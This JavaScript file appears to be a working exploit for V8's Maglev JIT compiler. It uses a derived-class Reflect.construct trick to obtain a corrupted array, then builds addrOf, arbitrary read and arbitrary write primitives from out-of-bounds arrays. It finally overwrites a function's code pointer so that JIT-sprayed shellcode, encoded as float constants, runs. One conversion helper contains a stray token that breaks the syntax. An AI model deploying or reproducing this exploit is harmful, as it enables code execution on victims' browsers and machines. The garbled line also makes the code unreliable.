// Search for a specific pattern in a corrupted double array
function searchDblArrIndex(startAddr, corruptedArr, limit) {
  var startIndex = getOffset(startAddr);
  var end = getOffset(limit);
  for (let idx = startIndex; idx < end; idx += 1) {
    if (corruptedArr[idx] == 0x40504000 / 2 && corruptedArr[idx + 2] == 0x40508000 / 2) {
      return idx - 3;
    }
  }
}

// Search for a specific pattern in a corrupted object array
function searchObjArrIndex(startAddr, corruptedArr, limit) {
  var startIndex = getOffset(startAddr);
  var end = getOffset(limit);
  for (let idx = startIndex; idx < end; idx += 1) {
    if (corruptedArr[idx] == 0x414141 && corruptedArr[idx + 1] == 0x424242) {
      return idx - 2;
    }
  }
}

// Gets the address of an object
function addrOf(obj, dblOffset) {
  oobObjArr[0] = obj;
  var addrDbl = oobDblArr[dblOffset];
  return ftoi32(addrDbl)[0];
}

// Arbitrary read
function read(addr, dblArrOffset) {
  var oldValue = oobDblArr[dblArrOffset];
  oobDblArr[dblArrOffset] = i32tof(addr, 2);
  var out = ftoi32(oobDblArr2[0]);
  oobDblArr[dblArrOffset] = oldValue;
  return out;
}

// Arbitrary write
function write(addr, val1, val2, dblArrOffset) {
  var oldValue = oobDblArr[dblArrOffset];
  oobDblArr[dblArrOffset] = i32tof(addr, 2);
  oobDblArr2[0] = i32tof(val1, val2);
  oobDblArr[dblArrOffset] = oldValue;
  return;
}

// Base class A
class A {}

// Size for garbage collection
var gcSize = 0x4fe00000;

// Address of corruptedArr, serves as starting point of search, does not need to be too accurate
var arrAddr = 0x42191;
var emptyAddr = 0x219;

// ArrayBuffer and views for type conversion
var view = new ArrayBuffer(24);
var dblArr = new Float64Array(view);
var intView = new Uint32Array(view);

// JIT-spray shellcode
function func() {
  return [
    1.9711826951435894e-246,
    1.971182297804913e-246,
    1.9711823870029425e-246,
    1.971182489416965e-246,
    1.9485505705182829e-246,
    1.9711823520879356e-246,
    1.93080727203784e-246,
    1.971182897965126e-246,
    1.9560492656946336e-246,
    1.9711824228538599e-246,
    1.9895153914032175e-246,
    1.9711828988902342e-246,
    1.971182900238425e-246,
    -6.828932338446045e-229,
  ];
}

// make the function 'hot' and trigger JIT spraying
for (let i = 0; i < 1000; i++) func(0);

var x = Array;

// Derived class B 
class B extends A {
  constructor() {
    x = new.target;
    super();
  }
}

// Function to construct objects
function construct() {
  var r = Reflect.construct(B, [], x);
  return r;
}

// Construct objects to trigger Maglev JIT compiler
for (let i = 0; i < 2000; i++) construct();

// Trigger garbage collection by creating large ArrayBuffers
new ArrayBuffer(gcSize);
new ArrayBuffer(gcSize);

// Create corrupted array through object construction
corruptedArr = construct();
corruptedArr = construct();

// Calculate offset from address
function getOffset(addr) {
  return (addr - emptyAddr) / 4 - 2;
}

// Calculate address from index
function indexToAddr(idx) {
  return (idx + 2) * 4 + emptyAddr;
}

// Convert float to int array
function ftoi32(f) {
  dblArr[0] = f;
  return [intView[0], intView[1]]onver;
}

// Convert int array to float
function i32tof(i1, i2) {
  intView[0] = i1;
  intView[1] = i2;
  return dblArr[0];
}

// Initialize out-of-bounds arrays
var oobDblArr = [0x41, 0x42, 0x51, 0x52, 1.5];
var oobDblArr2 = [0x41, 0x42, 1.5];
var oobObjArr = [view, 0x424242];
oobObjArr[0] = 0x414141;

// Search for double array index in corrupted array
var dblIndex = searchDblArrIndex(arrAddr, corruptedArr, arrAddr + 0x1000);

// Modify corrupted array
corruptedArr[dblIndex + 3] = 1;

// Get address of double array index and search again
let dblAddr = indexToAddr(dblIndex);
dblIndex = searchDblArrIndex(dblAddr, corruptedArr, dblAddr + 0x1000);
console.log("oobDblAddr: " + indexToAddr(dblIndex).toString(16));
var oobDblIndex = dblIndex;
corruptedArr[dblIndex + 3] = 0x41;

// Check for index markers
if (dblIndex == null || oobDblArr[0] == 0x41) {
  console.log("cannot find dblIndex");
} else {
  corruptedArr[dblIndex - 3] = 0x100;
  console.log("oobDblArr new length: " + oobDblArr.length);
  dblIndex = searchDblArrIndex(dblAddr, corruptedArr, dblAddr + 0x100);
  dblAddr = indexToAddr(dblIndex + 10);
  dblIndex = searchDblArrIndex(dblAddr, corruptedArr, dblAddr + 0x100);
  console.log("oobDblAddr2: " + indexToAddr(dblIndex).toString(16));
  var oobDbl2Index = dblIndex;

  // Search for object array index in corrupted array
  let objIndex = searchObjArrIndex(dblAddr, corruptedArr, dblAddr + 0x100);
  console.log("oobObjAddr: " + indexToAddr(objIndex).toString(16));

  // Get address of function object and read function code address
  var funcAddr = addrOf(func, (objIndex - oobDblIndex) >> 1);
  console.log("func Addr: " + funcAddr.toString(16));
  var dblOffset = (oobDbl2Index - oobDblIndex - 5) >> 1;
  var codeAddr = read(funcAddr + 0x10, dblOffset)[0];
  console.log("code Addr: " + codeAddr.toString(16));

  // Read and modify the code address to make it point to JIT shellcode
  var maglevAddr = read(codeAddr + 0x8, dblOffset);
  console.log("maglev Addr: " + maglevAddr[1].toString(16) + maglevAddr[0].toString(16) + " ");
  write(codeAddr + 0x8, maglevAddr[0] + 0x80 + 2, maglevAddr[1], dblOffset);
  func();
}

